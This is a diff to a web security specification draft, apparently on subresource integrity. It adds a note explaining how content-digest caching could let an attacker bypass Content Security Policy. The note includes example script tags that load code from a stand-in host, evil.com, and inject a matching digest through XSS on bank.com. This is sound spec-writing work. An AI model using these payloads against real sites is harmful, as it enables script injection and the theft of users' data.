@@ -885,8 +885,31 @@ For instance:
 * XMLHttpRequest may only load data from same-origin resources, or from
   resources delivered with proper CORS headers. [[!XMLHTTPREQUEST]]
 
-TODO: Moar.
+* Content Security Policy performs origin-based security checks. [[!CSP]]
+
+TODO: Moar?
 {: .todo}
+
+<div class="note">
+The simple cache-poisoning version of this attack can be mitigated by
+requiring strong hash functions for cachable resources. More complex
+variants are more difficult to mitigate. Consider the following:
+
+1.  An attacker lures Alice to a page containing the following code:
+
+        <script src="http://evil.com/evil.js" digest="ni://sha-256;123...789">
+
+2.  Alice's user agent loads `evil.js`, and stores it in her cache.
+
+3.  Though `bank.com` is protected by a CSP which allows only script from
+    `bank.com`, the attacker may still be able to exploit an XSS vulnerability
+    in `bank.com` which allows the injection of:
+
+        <script src="http://bank.com/awesome.js" digest="ni://sha-256;123...789">
+
+    Since the script appears to come from `bank.com`, CSP allows it, even though
+    it doesn't actually exist on that server.
+</div>
 
 [onerror]: http://www.w3.org/TR/html5/webappapis.html#runtime-script-errors
 [cors]: http://www.w3.org/TR/html5/infrastructure.html#cors-cross-origin
